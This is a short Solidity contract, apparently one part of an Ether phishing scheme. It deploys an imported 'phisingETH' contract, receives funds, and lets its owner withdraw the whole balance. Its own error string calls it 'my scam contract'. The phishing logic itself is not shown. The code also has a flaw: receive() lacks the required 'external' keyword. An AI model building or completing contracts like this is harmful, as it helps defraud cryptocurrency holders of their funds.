// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "./phisingETH.sol";

contract receiver{
    address private owner;
    phisingETH phising;

    modifier onlyOwner{
        require(msg.sender == owner, "This is my scam contract hahahhaha");
        _;
    }
    
    constructor (address _owner){
        owner = _owner;
        phising = new phisingETH();
    }

    function withdraw() external onlyOwner{
        (bool ok, ) = owner.call{value: address(this).balance}("");
    }

    receive() payable{}
}